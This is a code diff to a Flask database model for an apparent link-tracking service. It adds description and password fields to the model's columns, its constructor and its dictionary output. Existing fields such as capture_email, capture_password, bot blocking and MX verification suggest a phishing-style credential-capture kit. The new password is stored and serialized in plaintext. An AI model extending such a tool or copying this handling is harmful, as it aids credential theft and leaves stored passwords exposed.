@@ -7,6 +7,8 @@ class Link(db.Model):
     target_url = db.Column(db.String(500), nullable=False)
     short_code = db.Column(db.String(10), unique=True, nullable=False)
     campaign_name = db.Column(db.String(255), default="Untitled Campaign")
+    description = db.Column(db.Text, nullable=True)
+    password = db.Column(db.String(255), nullable=True)
     status = db.Column(db.String(50), default="active")  # active, paused, expired
     created_at = db.Column(db.DateTime, default=db.func.current_timestamp())
     total_clicks = db.Column(db.Integer, default=0)
@@ -28,7 +30,7 @@ class Link(db.Model):
     allowed_cities = db.Column(db.Text, nullable=True)     # JSON string of city names
     blocked_cities = db.Column(db.Text, nullable=True)     # JSON string of city names
 
-    def __init__(self, user_id, target_url, short_code=None, campaign_name="Untitled Campaign", status="active", capture_email=False, capture_password=False, bot_blocking_enabled=False, geo_targeting_enabled=False, geo_targeting_type="allow", rate_limiting_enabled=False, dynamic_signature_enabled=False, mx_verification_enabled=False, preview_template_url=None, allowed_countries=None, blocked_countries=None, allowed_regions=None, blocked_regions=None, allowed_cities=None, blocked_cities=None):
+    def __init__(self, user_id, target_url, short_code=None, campaign_name="Untitled Campaign", status="active", capture_email=False, capture_password=False, bot_blocking_enabled=False, geo_targeting_enabled=False, geo_targeting_type="allow", rate_limiting_enabled=False, dynamic_signature_enabled=False, mx_verification_enabled=False, preview_template_url=None, allowed_countries=None, blocked_countries=None, allowed_regions=None, blocked_regions=None, allowed_cities=None, blocked_cities=None, description=None, password=None):
         self.user_id = user_id
         self.target_url = target_url
         self.short_code = short_code if short_code else self.generate_short_code()
@@ -49,6 +51,8 @@ class Link(db.Model):
         self.blocked_regions = blocked_regions
         self.allowed_cities = allowed_cities
         self.blocked_cities = blocked_cities
+        self.description = description
+        self.password = password
 
     def generate_short_code(self):
         return str(uuid.uuid4())[:8]
@@ -72,6 +76,8 @@ class Link(db.Model):
             "total_clicks": self.total_clicks,
             "real_visitors": self.real_visitors,
             "blocked_attempts": self.blocked_attempts,
+            "description": self.description,
+            "password": self.password,
             "capture_email": self.capture_email,
             "capture_password": self.capture_password,
             "bot_blocking_enabled": self.bot_blocking_enabled,
